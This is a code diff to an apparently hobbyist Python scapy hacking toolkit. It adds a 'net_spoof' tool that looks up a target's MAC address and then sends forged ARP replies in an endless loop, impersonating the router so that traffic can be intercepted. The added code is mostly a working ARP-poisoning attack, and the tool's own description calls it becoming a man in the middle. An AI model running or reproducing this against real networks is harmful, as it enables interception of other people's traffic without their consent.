@@ -1,4 +1,5 @@
 import scapy.all as scapy
+import time
 import pyfiglet
 import http as server
 import subprocess
@@ -65,20 +66,45 @@ class Net_detect:
             print(el[1].psrc + "\t\t" + el[1].hwsrc + "\t\t" + MacLookup().lookup(el[1].hwsrc))
 
 
+class Net_spoof:
+    def __init__(self, id, name, info):
+        self.id = id
+        self.name = name
+        self.info = info
+    def _method_(self, *args):
+        try:
+            parsed_args = args[0]
+            targetIp = parsed_args[0]
+            routerIp = parsed_args[1]
+        except IndexError:
+            print('[-] Check if options are correct. [targetIP routerIP]')
+            print(type(args))
+            read_command()
 
+        arpRequest = scapy.ARP(pdst=targetIp)
+        broadcast =scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+        arpRequestBroadcast = broadcast/arpRequest
+        answeredList = scapy.srp(arpRequestBroadcast, timeout=1, verbose=False)[0]
 
-#        mac_table = PrettyTable(['IP', 'MAC address', 'Vendor'])
-#        for el in answered:
-#           mac_table.add_row([el[1].prsc, el[1].hwsrc, MacLookup.lookup(el[1].hwsrc)])
+        counter = 0
+        while True:
+            targetMac = answeredList[0][1].hwsrc
+            packet = scapy.ARP(op=2, pdst=targetIp, hwdst=targetMac, psrc=routerIp)
+            scapy.send(packet, verbose=False)
+            counter += 2
+            print(f'[+] Packets sent --- {counter}')
+            time.sleep(2)
 
 def set_tools():
     info_mac_change = 'Changes your MAC address\n options are interface and new_mac.'
     info_net_detect = 'Detects all devices in the network\n options are yourIP/24'
+    info_net_spoof = 'Spoofs the target IP and the router to become man in the midle\n options are targetIp and routerIP'
 
     mac_change = Mac_change(0,'mac_change', info_mac_change)
     net_detect  = Net_detect(1,'net_detect', info_net_detect)
+    net_spoof = Net_spoof(2, 'net_spoof', info_net_spoof)
 
-    return [mac_change, net_detect]
+    return [mac_change, net_detect, net_spoof]
 
 def display_tools():
     tools = set_tools()
@@ -143,7 +169,7 @@ def run_tools(parsed_event):
     options = parsed_event[1]
 
     set_tools()[tool]._method_(options)
-
+    # fix IndexError of tools
 
 def read_command():
     set_tools()
